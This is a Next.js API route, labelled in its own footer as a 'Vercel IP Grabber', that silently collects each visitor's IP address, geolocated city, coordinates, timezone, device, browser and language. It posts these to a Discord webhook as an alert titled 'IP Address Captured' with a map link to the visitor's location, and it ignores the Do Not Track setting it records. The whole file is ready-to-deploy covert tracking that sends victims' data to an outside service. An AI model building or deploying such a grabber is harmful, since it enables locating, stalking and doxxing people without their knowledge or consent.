import { type NextRequest, NextResponse } from "next/server"
import { geolocation } from "@vercel/functions"

function isValidIP(ip: string): boolean {
  const ipv4Pattern = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/
  const ipv6Pattern =
    /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^([0-9a-fA-F]{1,4}:){1,7}:|^([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}$/

  return ipv4Pattern.test(ip) || ipv6Pattern.test(ip)
}

function extractIP(request: NextRequest): string {
  const forwardedFor = request.headers.get("x-forwarded-for")
  const realIP = request.headers.get("x-real-ip")
  const cfConnectingIP = request.headers.get("cf-connecting-ip")
  const trueClientIP = request.headers.get("true-client-ip")

  if (forwardedFor) {
    const ips = forwardedFor.split(",").map((ip) => ip.trim())
    if (ips.length > 0 && isValidIP(ips[0])) {
      return ips[0]
    }
  }

  if (cfConnectingIP && isValidIP(cfConnectingIP)) {
    return cfConnectingIP
  }

  if (trueClientIP && isValidIP(trueClientIP)) {
    return trueClientIP
  }

  if (realIP && isValidIP(realIP)) {
    return realIP
  }

  return "Unknown"
}

function parseUserAgent(userAgent: string) {
  let browser = "Unknown"
  let os = "Unknown"
  let device = "Unknown"

  if (userAgent.includes("Firefox/")) {
    browser = "Firefox"
  } else if (userAgent.includes("Chrome/") && !userAgent.includes("Edg/") && !userAgent.includes("OPR/")) {
    browser = "Chrome"
  } else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/")) {
    browser = "Safari"
  } else if (userAgent.includes("Edg/")) {
    browser = "Edge"
  } else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) {
    browser = "Opera"
  }

  if (userAgent.includes("Windows")) {
    os = "Windows"
    if (userAgent.includes("Windows NT 10.0")) os = "Windows 10/11"
    else if (userAgent.includes("Windows NT 6.3")) os = "Windows 8.1"
    else if (userAgent.includes("Windows NT 6.2")) os = "Windows 8"
    else if (userAgent.includes("Windows NT 6.1")) os = "Windows 7"
  } else if (userAgent.includes("Mac OS X")) {
    os = "macOS"
  } else if (userAgent.includes("Android")) {
    os = "Android"
    device = "Mobile"
  } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
    os = "iOS"
    if (userAgent.includes("iPhone")) device = "iPhone"
    else if (userAgent.includes("iPad")) device = "iPad"
    else device = "iOS Device"
  } else if (userAgent.includes("Linux")) {
    os = "Linux"
  }

  if (device === "Unknown") {
    if (userAgent.includes("Mobile")) {
      device = "Mobile"
    } else if (userAgent.includes("Tablet")) {
      device = "Tablet"
    } else {
      device = "Desktop"
    }
  }

  return { browser, os, device }
}

export async function POST(request: NextRequest) {
  try {
    const ip = extractIP(request)
    const geo = geolocation(request)
    const userAgent = request.headers.get("user-agent") || "Unknown"
    const { browser, os, device } = parseUserAgent(userAgent)

    const acceptLanguage = request.headers.get("accept-language") || "Unknown"
    const languages = acceptLanguage
      .split(",")
      .map((lang) => lang.split(";")[0].trim())
      .filter(Boolean)
    const primaryLanguage = languages[0] || "Unknown"

    const dnt = request.headers.get("dnt") === "1" ? "Enabled" : "Disabled"

    const now = new Date()
    const timestamp = now.toISOString()

    const ipData = {
      ip: ip,
      country: geo.country || "Unknown",
      region: geo.region || "Unknown",
      city: geo.city || "Unknown",
      latitude: geo.latitude || "Unknown",
      longitude: geo.longitude || "Unknown",
      timezone: geo.timezone || "Unknown",
      timestamp: timestamp,
      userAgent: userAgent,
      browser: browser,
      os: os,
      device: device,
      language: primaryLanguage,
      dnt: dnt,
    }

    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL

    if (discordWebhookUrl) {
      const discordPayload = {
        embeds: [
          {
            title: "🎯 IP Address Captured",
            color: 0xff4444,
            fields: [
              {
                name: "🌐 IP Address",
                value: `\`${ipData.ip}\``,
                inline: true,
              },
              {
                name: "📍 Location",
                value: `${ipData.city || "Unknown"}, ${ipData.region || "Unknown"}, ${ipData.country || "Unknown"}`,
                inline: true,
              },
              {
                name: "🗺️ Coordinates",
                value:
                  ipData.latitude && ipData.longitude && ipData.latitude !== "Unknown" && ipData.longitude !== "Unknown"
                    ? `[${ipData.latitude}, ${ipData.longitude}](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})`
                    : "Unknown",
                inline: true,
              },
              {
                name: "⏰ Timestamp",
                value: `<t:${Math.floor(new Date(timestamp).getTime() / 1000)}:F>`,
                inline: true,
              },
              {
                name: "🌍 Timezone",
                value: ipData.timezone || "Unknown",
                inline: true,
              },
              {
                name: "💻 Device Info",
                value: `**OS**: ${ipData.os}\n**Browser**: ${ipData.browser}\n**Type**: ${ipData.device}`,
                inline: false,
              },
              {
                name: "🔤 Language",
                value: ipData.language,
                inline: true,
              },
              {
                name: "🔒 DNT (Do Not Track)",
                value: ipData.dnt,
                inline: true,
              },
              {
                name: "🖥️ User Agent",
                value: `\`\`\`${ipData.userAgent.substring(0, 256)}${ipData.userAgent.length > 256 ? "..." : ""}\`\`\``,
                inline: false,
              },
            ],
            footer: {
              text: "Vercel IP Grabber - High Accuracy",
            },
            timestamp: timestamp,
          },
        ],
      }

      await fetch(discordWebhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(discordPayload),
      })
    }

    return NextResponse.json({
      ip: ipData.ip,
      country: ipData.country,
      region: ipData.region,
      city: ipData.city,
      timestamp: ipData.timestamp,
      browser: ipData.browser,
      os: ipData.os,
      device: ipData.device,
    })
  } catch (error) {
    console.error("Error capturing IP:", error)
    return NextResponse.json({ error: "Failed to capture IP information" }, { status: 500 })
  }
    }
